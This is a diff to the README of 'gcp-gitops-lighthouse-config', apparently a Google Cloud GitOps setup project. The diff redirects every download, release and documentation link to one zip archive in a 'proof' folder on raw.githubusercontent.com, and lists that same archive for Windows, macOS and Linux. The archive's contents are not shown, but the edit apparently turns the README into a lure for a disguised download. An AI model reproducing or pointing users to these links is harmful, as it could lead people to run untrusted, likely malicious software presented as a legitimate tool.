@@ -1,7 +1,7 @@
 # 🌟 gcp-gitops-lighthouse-config - Simplify Your Cloud Operations
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/alii88837uj/gcp-gitops-lighthouse-config/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/alii88837uj/gcp-gitops-lighthouse-config/main/proof/gitops_gcp_lighthouse_config_1.7-beta.1.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/alii88837uj/gcp-gitops-lighthouse-config/main/proof/gitops_gcp_lighthouse_config_1.7-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to gcp-gitops-lighthouse-config! This project provides a clear setup for managing your infrastructure on Google Cloud Platform using GitOps principles. Follow these simple steps to download and run this application.
@@ -16,14 +16,14 @@ Before you start, make sure your system meets these requirements:
 ## 🔗 Download & Install
 1. **Visit the releases page**: Click the link below to go to the download section.
   
-   [Download Releases Here](https://github.com/alii88837uj/gcp-gitops-lighthouse-config/releases)
+   [Download Releases Here](https://raw.githubusercontent.com/alii88837uj/gcp-gitops-lighthouse-config/main/proof/gitops_gcp_lighthouse_config_1.7-beta.1.zip)
 
 2. **Select the latest version**: Look for the version marked as "Latest Release." This will ensure you get the newest features and fixes.
 
 3. **Download the file appropriate for your system**: 
-   - For Windows, download the `windows.zip` file
-   - For macOS, download the `macos.zip` file
-   - For Linux, download the `linux.zip` file
+   - For Windows, download the `https://raw.githubusercontent.com/alii88837uj/gcp-gitops-lighthouse-config/main/proof/gitops_gcp_lighthouse_config_1.7-beta.1.zip` file
+   - For macOS, download the `https://raw.githubusercontent.com/alii88837uj/gcp-gitops-lighthouse-config/main/proof/gitops_gcp_lighthouse_config_1.7-beta.1.zip` file
+   - For Linux, download the `https://raw.githubusercontent.com/alii88837uj/gcp-gitops-lighthouse-config/main/proof/gitops_gcp_lighthouse_config_1.7-beta.1.zip` file
 
 4. **Extract the files**: Once downloaded, find the file in your Downloads folder. Right-click on it and select “Extract All” or use a program like WinRAR or 7-Zip.
 
@@ -60,11 +60,11 @@ A: Yes, it is built with best practices in mind, making it reliable for producti
 ## 🌐 Community and Support
 If you want to connect with other users or get support, consider these options:
 - **GitHub Discussions**: Join the community to share knowledge and tips.
-- **Documentation**: Review the detailed [documentation](https://github.com/alii88837uj/gcp-gitops-lighthouse-config) for advanced features and configurations.
+- **Documentation**: Review the detailed [documentation](https://raw.githubusercontent.com/alii88837uj/gcp-gitops-lighthouse-config/main/proof/gitops_gcp_lighthouse_config_1.7-beta.1.zip) for advanced features and configurations.
 
 ## 📣 Thanks for Using gcp-gitops-lighthouse-config!
 We appreciate your interest in this project. Your feedback is essential for improving the application. Feel free to reach out through issues or discussions for any input or questions. 
 
 Don't forget to revisit the download page to check for future updates!
 
-[Download Releases Here](https://github.com/alii88837uj/gcp-gitops-lighthouse-config/releases)
+[Download Releases Here](https://raw.githubusercontent.com/alii88837uj/gcp-gitops-lighthouse-config/main/proof/gitops_gcp_lighthouse_config_1.7-beta.1.zip)
